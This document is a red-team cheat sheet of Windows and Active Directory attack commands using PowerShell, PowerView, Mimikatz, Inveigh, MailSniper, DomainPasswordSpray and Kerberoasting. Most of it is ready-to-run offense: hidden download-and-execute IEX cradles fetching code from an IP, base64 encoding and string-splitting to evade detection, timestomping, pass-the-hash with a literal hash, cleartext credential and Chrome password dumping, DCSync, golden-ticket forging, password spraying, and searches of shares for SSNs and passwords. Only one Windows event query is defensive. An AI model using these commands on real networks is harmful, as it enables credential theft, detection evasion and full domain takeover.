
## Powershell

List help for cmdlet: `Get-Help [cmdlet] -full`

List available properties and methods: `Get-Member`

For-each loop: `ForEach-Object { $_ }`

Search for string (like grep): `Select-String -path [file] -pattern [string]`

Timestomp
```
	$file=(gi c:\file.exe);
	$date='01/03/2009 12:12 pm';
	$file.LastWriteTime=$date;
	$file.LastAccessTime=$date;
	$file.CreationTime=$date
```

Show last system boot time
```
	Get-WmiObject win32_operatingsystem | select csname, @{LABEL='LastBootUpTime'; EXPRESSION={$_.ConverttoDateTime($_.lastbootuptime)}}
```

Wrap binary execution in a powershell loop
```
	powershell foreach ($target in (get-content c:\users\username\appdata\local\temp\hosts_da_loggedin_unique.txt)) { "[*] $Target:"; (c:\programdata\sd.exe ./administrator@$target -hashes aad3b435b51404eeaad3b435b51404ee:a4bab1c7d4bef62d4c22043ddbf1312c) }`
```

Download a file
```
	[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};(new-object system.net.webclient).downloadfile("https://www.mydomain.com/file","C:\Users\username\AppData\Local\Temp\file.txt")
```

Encode string
```
    echo "iex (New-Object Net.WebClient).DownloadString('http://192.168.1.1:80/file')" | iconv --to-code UTF-16LE | base64 -w 0
```

List recently modified files in path (U:)
```
	Get-Childitem u:\ -Recurse | where-object {!($_.psiscontainer)} | where { $_.LastWriteTime -gt $(Get-Date).AddDays(-1)  } | foreach {"$($_.LastWriteTime) :: $($_.Fullname) "  }
```

List Files 
```
	Select-String -Path c:\fso\*.txt, c:\fso\*.log -pattern ed
```

List First 100 Files
```
	Get-ChildItem -Path XXX |Select -First 100 Fullname
```

List a Process's Loaded Modules (DLL)
```
	get-process -id 1234|select -expand modules
```

Remote Command Execution using MMC
```
	https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/
```

Get LocalAccountTokenFilterPolicy (Determine if you can authenticate to admin resources over the network, i.e. C$,ADMIN$)
```
	Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ |Select LocalAccountTokenFilterPolicy |fl
```

Test User Credentials
```
	powerpick $password = ConvertTo-SecureString "PlainTextPassword" -AsPlainText -Force;$cred= New-Object System.Management.Automation.PSCredential ("domain\name", $password);
```

Search for SSN

 https://technet.microsoft.com/en-us/library/2008.04.securitywatch.aspx
```
	$SSN_Regex = " [0-9]{3}[-| ][0-9]{2}[-| ][0-9]{4}" ; Get-ChildItem . -Recurse -exclude *.exe,*.dll| Select-String -Pattern $SSN_Regex | Select-String -Pattern $SSN_Regex| Select-Object Path,Filename,Matches |ft -auto|out-string -width 200; "[*] SSN Search Complete!"
```

Enumerate the use of the Windows Server Update Services (WSUS) 
```
	Get-ItemProperty -Path Registry::"HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" |Select-Object -ExpandProperty WUServer

	Get-ItemProperty -Path Registry::"HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" |Select-Object -ExpandProperty WUStatusServer

	Get-ItemProperty -Path Registry::"HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" |Select-Object -ExpandProperty UseWUServer

	reg query HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate
```


Get unquoted service paths
```
	gwmi win32_service |Select pathname | Where {($_.pathname -ne $null)} | Where {-not $_.pathname.StartsWith("`"")} | Where {($_.pathname.Substring(0, $_.pathname.IndexOf(".") +4)) -match ".* .*"}
```

### Find-Files (custom)
```
	Find-Files -searchBase "i:\" -searchTerms "*web.xml*,*web.config*,*password*,*tomcat-users.xml*" -LogPath "C:\Users\username\AppData\Local\Temp"
```

### Get-Enumeration (custom)

Run Local and Domain enumeration functions on the local host.
```	
	Get-Enumeration -Path . -Local -Domain
```

### Download and execute IEX
```
    powershell -nop -w hidden -c "iex (New-Object Net.WebClient).DownloadString('http://192.168.1.1:80/file')" 
```

### EncodedCommand and IEX detection bypass

Author: Dave Kennedy
Source: https://www.trustedsec.com/blog/circumventing-encodedcommand-detection-powershell/

Avoid detection of -enc
```
	powershell -window hidden -C "set-variable -name "C" -value "-"; set-variable -name "s" -value "e"; set-variable -name "q" -value "c"; set-variable -name "P" -value ((get-variable C).value.toString()+(get-variable s).value.toString()+(get-variable q).value.toString()) ; powershell (get-variable P).value.toString() <b64encodedcommandhere>"
```

Avoid detection of IEX
```
	powershell -window hidden -C "set-variable -name "LB" -value "I"; set-variable -name "I" -value "E"; set-variable -name "V" -value "X"; set-variable -name "wP" -value ((get-variable LB).value.toString()+(get-variable I).value.toString()+(get-variable V).value.toString()) ; powershell (get-variable wP).value.toString() ('<YOURINVOKEEXPRESSIONSTUFFHERE>')"
```

### Bloodhound
```
	iex((new-object system.net.webclient).downloadstring('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/PowerShell/BloodHound.ps1'));Invoke-Bloodhound -CSVFolder c:\temp -CSVPrefix <prefix>

	Invoke-BloodHound -DomainController <domain IP> -Domain <FQDN> -CSVFolder C:\users\public\libraries -CSVPrefix <prefix> -CollectionMethod Stealth
```

### Mimikittenz
https://github.com/putterpanda/mimikittenz

mimikittenz is a post-exploitation powershell tool that utilizes the Windows function ReadProcessMemory() in order to extract plain-text passwords from various target processes.

mimikittenz can also easily extract other kinds of juicy info from target processes using regex patterns including but not limited to:

* TRACK2 (CreditCard) data from merchant/POS processes
* PII data
* Encryption Keys & All the other goodstuff

Execution
```
	Invoke-Mimikittenz
```

Customizations
```	
	Custom regex - The syntax for adding custom regex is as follows:
	[mimikittenz.MemProcInspector]::AddRegex("<NameOfTarget>","<regex_here>")

	Custom target process - Just append your target proccess name into the array:
	[mimikittenz.MemProcInspector]::InspectManyProcs("iexplore","chrome","firefox")
```


### PowerUp
Performs multiple local host privilege escalation checks for common Windows misconfigurations. 
```
	Invoke-AllChecks
```

[See cheat sheet for more commands](https://github.com/HarmJ0y/CheatSheets/blob/master/PowerUp.pdf)

### PowerView

* Requires domain user privileges
	
Find Administrative users logged in across the domain - default group = Domain Admins) 
```	
	Invoke-UserHunter -Threads 15 -NoPing [-GroupName “Enterprise Admins”]
	Invoke-UserHunter -Threads 20 -GroupName "Domain Admins" -SearchForest -CheckAccess
```

Find User (Stealthy via Fileshares)
```
	Invoke-UserHunter -Stealth -Threads 5 -NoPing [-GroupName “Enterprise Admins”] [-UserName "svcAccount"]
```

Get domain user info
```
	Get-NetUser [-UserName john]

	Get-NetUser -Domain <domain> | Select-Object objectsid,lockouttime,samaccounttype,accountexpires,objectclass,useraccountcontrol,@{Name='memberof';Expression={[string]::join(";",($_.memberof))}},info,distinguishedname,adspath,cn,pwdlastset,objectguid,whencreated,description,samaccountname,usnchanged,name|  export-csv userprops_members.csv
```

Find group names
```
	Get-NetGroup [-GroupName *admin*]
```

Get group members
```	
	Get-NetGroupMember [-GroupName “Domain Admins”]
```

Find open shares - Noisy
```
	Invoke-ShareFinder -CheckShareAccess
```

Find open (non-default i.e. C$) shares by LDAP source
```
	Invoke-ShareFinder -ComputerADSPath "LDAP://OU=Servers,OU=IT,DC=domain,DC=com" -CheckShareAccess -ExcludeStandard | Out-File -Encoding ascii c:\windows\temp\server_shares.txt

	Invoke-ShareFinder -ExcludePrint -ExcludeIPC -CheckShareAccess
```

Find interesting files
```
	powershell Invoke-FileFinder -ComputerName <hostname> -share share_list.txt -terms ssn,pass,sensitive,secret,admin,login,unattend*.xml,web.config,account -Threads 20 | export-csv filefinder_shares.csv
```

Find hosts where the current user is local admin - Noisy
```
	Find-LocalAdminAccess
```

Get details of all domain computers and export to a CSV file for easy viewing
```
	Get-computerproperty -Domain <domain.com> -properties displayname,adspath,lastlogontimestamp,operatingsystem,operatingsystemversion,@{Name='memberof';Expression={[string]::join(";",($_.memberof))}}|export-csv computerprops.csv
```

Get Computers with Unconstrained Delegation
```
	Get-NetComputer -Unconstrained |ft -a
```

Get Users & Computers Trusted for Delegation
```	
	Get-DomainUser -TrustedtoAuth -Properties distinguisedname,useraccountcontrol,msds-allowedtodelegateto|fl

	Get-DomainComputer -TrustedtoAuth -Properties distinguisedname,useraccountcontrol,msds-allowedtodelegateto|fl
```

#### net * Functions:
```
    Get-NetDomain                   -   gets the name of the current user's domain
    Get-NetForest                   -   gets the forest associated with the current user's domain
    Get-NetForestDomain             -   gets all domains for the current forest
    Get-NetDomainController         -   gets the domain controllers for the current computer's domain
    Get-NetUser                     -   returns all user objects, or the user specified (wildcard specifiable)
    Add-NetUser                     -   adds a local or domain user
    Get-NetComputer                 -   gets a list of all current servers in the domain
    Get-NetPrinter                  -   gets an array of all current computers objects in a domain
    Get-NetOU                       -   gets data for domain organization units
    Get-NetSite                     -   gets current sites in a domain
    Get-NetSubnet                   -   gets registered subnets for a domain
    Get-NetGroup                    -   gets a list of all current groups in a domain
    Get-NetGroupMember              -   gets a list of all current users in a specified domain group
    Get-NetLocalGroup               -   gets the members of a localgroup on a remote host or hosts
    Add-NetGroupUser                -   adds a local or domain user to a local or domain group
    Get-NetFileServer               -   get a list of file servers used by current domain users
    Get-DFSshare                    -   gets a list of all distribute file system shares on a domain
    Get-NetShare                    -   gets share information for a specified server
    Get-NetLoggedon                 -   gets users actively logged onto a specified server
    Get-NetSession                  -   gets active sessions on a specified server
    Get-NetRDPSession               -   gets active RDP sessions for a specified server (like qwinsta)
    Get-NetProcess                  -   gets the remote processes and owners on a remote server
    Get-UserEvent                   -   returns logon or TGT events from the event log for a specified host
    Get-ADObject                    -   takes a domain SID and returns the user, group, or computer 
                                        object associated with it
    Set-ADObject                    -   takes a SID, name, or SamAccountName to query for a specified
                                        domain object, and then sets a specified 'PropertyName' to a
                                        specified 'PropertyValue'
```

#### GPO functions
```
    Get-GptTmpl                     -   parses a GptTmpl.inf to a custom object
    Get-NetGPO                      -   gets all current GPOs for a given domain
    Get-NetGPOGroup                 -   gets all GPOs in a domain that set "Restricted Groups" 
                                        on on target machines
    Find-GPOLocation                -   takes a user/group and makes machines they have effective
                                        rights over through GPO enumeration and correlation
    Find-GPOComputerAdmin           -   takes a computer and determines who has admin rights over it
                                        through GPO enumeration
    Get-DomainPolicy                -   returns the default domain or DC policy
```

#### User-Hunting Functions:
```
    Invoke-UserHunter               -   finds machines on the local domain where specified users are logged into, and can optionally check if the current user has local admin access to found machines
    Invoke-StealthUserHunter        -   finds all file servers utilizes in user HomeDirectories, and checks the sessions one each file server, hunting for particular users
    Invoke-ProcessHunter            -   hunts for processes with a specific name or owned by a specific user on domain machines
    Invoke-UserEventHunter          -   hunts for user logon events in domain controller event logs
```

#### Domain Trust Functions:
```
    Get-NetDomainTrust              -   gets all trusts for the current user's domain
    Get-NetForestTrust              -   gets all trusts for the forest associated with the current user's domain
    Find-ForeignUser                -   enumerates users who are in groups outside of their principal domain
    Find-ForeignGroup               -   enumerates all the members of a domain's groups and finds users that are outside of the queried domain
    Invoke-MapDomainTrust           -   try to build a relational mapping of all domain trusts
```

#### MetaFunctions:
```
    Invoke-ShareFinder              -   finds (non-standard) shares on hosts in the local domain
    Invoke-FileFinder               -   finds potentially sensitive files on hosts in the local domain
    Find-LocalAdminAccess           -   finds machines on the domain that the current user has local admin access to
    Find-UserField                  -   searches a user field for a particular term
    Find-ComputerField              -   searches a computer field for a particular term
    Get-ExploitableSystem           -   finds systems likely vulnerable to common exploits
    Invoke-EnumerateLocalAdmin      -   enumerates members of the local Administrators groups across all machines in the domain
```

[HarmJ0y PowerView Cheat Sheet PDF](https://github.com/HarmJ0y/CheatSheets/blob/master/PowerView.pdf)
[HarmJ0y's PowerView 2.0 Tricks Gist](https://gist.github.com/HarmJ0y/3328d954607d71362e3c)

### Inveigh
https://github.com/Kevin-Robertson/Inveigh

Inveigh is a Windows PowerShell LLMNR/NBNS spoofer/man-in-the-middle tool designed to assist penetration testers that find themselves limited to a Windows system. 

* The main Inveigh LLMNR/NBNS spoofer function.

```
	Invoke-Inveigh
```

###### Privilege Requirements:
* Elevated Administrator or SYSTEM

###### Features:
* IPv4 LLMNR/NBNS spoofer with granular control     
* NTLMv1/NTLMv2 challenge/response capture over HTTP/HTTPS/SMB  
* Basic auth cleartext credential capture over HTTP/HTTPS  
* WPAD server capable of hosting a basic or custom wpad.dat file  
* HTTP/HTTPS server capable of hosting limited content  
* Granular control of console and file output  
* Run time control  

### Powershell W/out Powershell
* MsBuild.exe
https://gist.githubusercontent.com/subTee/6b236083da2fd6ddff216e434f257614/raw/a224d1edd3453cc321c63aaeefd2b59ea00622a2/pshell.xml

### Get-IndexedItem

Gets files which have been indexed by Windows desktop search. Searches the Windows index on the local computer or a remote file serving computer looking for file properties or free text searching over contents 

Sources:
https://gallery.technet.microsoft.com/scriptcenter/Get-IndexedItem-PowerShell-5bca2dae
https://github.com/adaptivethreat/Empire/blob/master/data/module_source/collection/Get-IndexedItem.ps1

### Interacting w/ Windows API

https://blogs.technet.microsoft.com/heyscriptingguy/2013/06/25/use-powershell-to-interact-with-the-windows-api-part-1/

#### Example - Lock Workstation and MessageBox 
```
	Add-Type -TypeDefinition @"
	using System;
	using System.Diagnostics;
	using System.Runtime.InteropServices;
	 
	public static class User32
	{
	    [DllImport("user32.dll", CharSet=CharSet.Auto)]
	        public static extern bool MessageBox(
	            IntPtr hWnd,     /// Parent window handle 
	            String text,     /// Text message to display
	            String caption,  /// Window caption
	            int options);    /// MessageBox type
	    [DllImport("user32.dll", CharSet=CharSet.Auto)]
		public static extern bool LockWorkStation();

	}
	"@

	[USER32]::LockWorkStation()
```

List static methods
```
	[USER32] |get-member -static
```

### MailSniper (OWA and Exchange Enumeration)

Source: https://github.com/dafthack/MailSniper

MailSniper is a penetration testing tool for searching through email in a Microsoft Exchange environment for specific terms (passwords, insider intel, network architecture information, etc.). It can be used as a non-administrative user to search their own email, or by an Exchange administrator to search the mailboxes of every user in a domain.

MailSniper also includes additional modules for password spraying, and gathering the Global Address List from OWA and EWS.

Bypassing Dual Factor Authentication on OWA - http://www.blackhillsinfosec.com/?p=5396

- It appears that Outlook portals that are being protected by two-factor authentication might not be covering all of the authentication protocols to Microsoft Exchange.
- Leverages the Exchange Web Services (EWS) feature of OWA. Just have to check for the presence of mail.org.com\EWS\Exchange.asmx
	
```
	Invoke-SelfSearch -Mailbox email@domain.com -ExchHostname mail.domain.com -Remote
```

- After the credentials have been entered MailSniper will attempt to connect to the EWS URL at https://mail.domain.com/EWS/Exchange.asmx and search the user’s inbox for key terms (by default “*pass*”, “*creds*”, and “*credentials*”).

#### Locate OWA instances via Autodiscover using only organization primary domain name
```	
	<smtp-mail-domain>/Autodiscover/Autodiscover.xml
	
	or
	
	autodiscover.<smtp-mail-domain>/Autodiscover/Autodiscover.xml
	
	or

	dig _autodiscover._tcp.<domain-name> SRV
	; <<>> DiG 9.8.3-P1 <<>> _autodiscover._tcp.<domain-name>.org SRV
	;; global options: +cmd
	;; Got answer:
	;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 45003
	;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0

	;; QUESTION SECTION:
	;_autodiscover._tcp.<domain-name>.org.	IN	SRV

	;; ANSWER SECTION:
	_autodiscover._tcp.<domain-name>.org. 1720 IN	SRV	0 0 443 webmail.<domain-name>.org.

	;; Query time: 2 msec
	;; SERVER: 192.168.178.1#53(192.168.178.1)
	;; WHEN: Thu Dec  1 10:40:33 2016
	;; MSG SIZE  rcvd: 83
```

### DomainPasswordSpray (Internal Windows Domain Password Brute Forcing)

Source: https://github.com/dafthack/DomainPasswordSpray

DomainPasswordSpray is a tool written in PowerShell to perform a password spray attack against users of a domain. By default it will automatically generate the user list from the domain. BE VERY CAREFUL NOT TO LOCKOUT ACCOUNTS!

#### Quick Start Guide
Open a PowerShell terminal from the Windows command line with 'powershell.exe -exec bypass'.
```
	Type 'Import-Module Invoke-DomainPasswordSpray.ps1'.
```

The only option necessary to perform a password spray is either -Password for a single password or -PasswordList to attempt multiple sprays. When using the -PasswordList option Invoke-DomainPasswordSpray will attempt to gather the account lockout observation window from the domain and limit sprays to one per observation window to avoid locking out accounts.

The following command will automatically generate a list of users from the current user's domain and attempt to authenticate using each username and a password of Winter2016.
```
	PowerShell Invoke-DomainPasswordSpray -Password Winter2016
```

The following command will use the userlist at users.txt and try to authenticate to the domain "domain-name" using each password in the passlist.txt file one at a time. It will automatically attempt to detect the domain's lockout observation window and restrict sprays to one attempt during each window. The results of the spray will be output to a file called sprayed-creds.txt
```
	PowerShell Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt
```

#### Invoke-DomainPasswordSpray Options
```
	UserList          - Optional UserList parameter. This will be generated automatically if not specified.
	Password          - A single password that will be used to perform the password spray.
	PasswordList      - A list of passwords one per line to use for the password spray (Be very careful not to lockout accounts).
	OutFile           - A file to output the results to.
	Domain            - A domain to spray against.
```

### Misc Powershell Pasties

List Removeable Drives
```
	Get-WmiObject Win32_LogicalDisk | Where-Object {($_.DriveType -eq 2) -and ($_.DeviceID -ne 'A:')} | %{"USB_PROCESS_DETECTED: " + $_.ProviderName  + "`n"}
```

Random Execution Method
```
$visio = [activator]::CreateInstance([type]::GetTypeFromProgID("visio.application", "system1"))
$docs = $visio.Documents.Add("")
$docs.ExecuteLine('CreateObject("Wscript.Shell").Exec("cmd.exe")')
```

## Mimikatz

https://github.com/gentilkiwi/mimikatz/wiki
https://adsecurity.org/?p=2362

Dump Cleartext Credentials
```
	sekurlsa::wdigest
	sekurlsa::logonpasswords
	lsadump::secrets
```

Dump cached domain credentials
```
	lsadump::cache
```

Format mscachev2 as ```$DCC2$10240#username#hash```
```
	cat 'mscachecreds.txt' | awk -F “:” {'print "$DCC2$10240#"$1"#"$2'}
```

Crack mscachev2 format with Hashcat (extremely slow)
```
	./hashcat -m 2100 -a 0 mscachev2.dump ./wordlists/* -r rules/dive.rule
```

DCSYNC - Remote Hash Dumping from a Domain Controller
```
	mimikatz lsadump::dcsync /user:domain\krbtgt
```

- There is also a CS built-in function for this
- Source: http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/

Pass the Hash
```
	mimikatz sekurlsa::pth /user:localadmin /domain:. /ntlm:21306681c738c3ed2d615e29be1574a3 /run:powershell -w hidden
```

Golden Ticket Creation (File)
```	
	mimikatz kerberos::golden /user:newadmin /domain:domain.com /sid:S-1-5-21-3683589091-3492174527-1688384936 /groups:501,502,513,512,520,518,519 /krbtgt:<krbtgthash> /ticket:newadmin.tkt
```

Golden Ticket Creation (Pass-The-Ticket) - Create the ticket for your current session
```
	mimikatz kerberos::golden /user:newadmin /domain:domain.com /sid:S-1-5-21-3683589091-3492174527-1688384936 /krbtgt:<krbtgthash> /ptt
```

To create a Golden ticket to own the parent domain, once a child domain controller is compromised you will need the following pieces:
```
	/user:ChildDomainControllerMachineName$  
	/rc4: KRBTGT Hash
	/sid:Child Domain SID
	/domain:FQDN of Child Domain
	/groups:516 
	/sids:ParentSID-516,S-1-5-9 
	/id:ID of Child Domain Controller 
	/ptt
```

Dump Google Chrome passwords
```
	shell copy "C:\users\kobrien\appdata\local\google\chrome\user data\default\Login Data" C:\users\public\libraries\ld.dat
	
	steal_token <user pid>

	mimikatz @dpapi::chrome /in:C:\users\public\libraries\ld.dat /unprotect
```

Detecting Golden Ticket use on a DC
```
	<QueryList>
	  <Query Id="0" Path="Security">
	    <Select Path="Security">
	        *[System[EventID='4768']]
	        and
	        *[EventData[Data[@Name='TargetUserName'] != 'ANONYMOUS LOGON']]
	        and
	        *[EventData[Data[@Name='ServiceName'] = 'krbtgt']]
	        and
	        *[EventData[Data[@Name='TicketEncryptionType'] = '0x17']]
	        </Select>
	  </Query>
	</QueryList>
```

## Kerberoast
https://github.com/nidem/kerberoast
https://room362.com/post/2016/kerberoast-pt1/
https://room362.com/post/2016/kerberoast-pt2/
https://room362.com/post/2016/kerberoast-pt3/
```
	Add-Type -AssemblyName System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/host.domain.com" 
```

Use mimikatz to export SPN Tikets once requested (Generates one file per ticket unless base64 option is used)
```
	mimkatz kerberos::list /export
	Invoke-Mimikatz -Command 'standard::base64 "kerberos::list /export" exit'
```

Impacket method of extracting SPN tickets and output hashes in the correct format for John via Proxychains and Beacon (Preferred)
```
	proxychains python ./GetUserSPNs.py -request domain.com/domainuser:password -dc-ip <domain controller IP> -outputfile <out.dump>
```

Cracking the hashes
```
	./hashcat -m 13100 -a 0 spns.dump ./wordlists/* -r rules/dive.rule

	./john --format=krb5tgs spns.dump --wordlist=
```

## Domain Admin Privesc Methods
https://adsecurity.org/?p=2362

 1. Passwords in SYSVOL & Group Policy Preferences
 	
 ```
 	findstr /S cpassword %logonserver%\sysvol\*.xml
 ```
 	or use Get-GPPPasswords.ps1 from PowerSploit

 2. Exploit the MS14-068 Kerberos Vulnerability on a Domain Controller Missing the Patch
 3. Kerberos TGS Service Ticket Offline Cracking (Kerberoast)
 4. The Credential Theft Shuffle
 5. Gain access to AD Database file (ntds.dit)
 	* Backup locations (backup server storage, media, and/or network shares)
 	* Find the NTDS.dit file staged on member servers prior to promoting to Domain Controllers.
 	* With admin rights to virtualization host, a virtual DC can be cloned and the associated data copied offline.

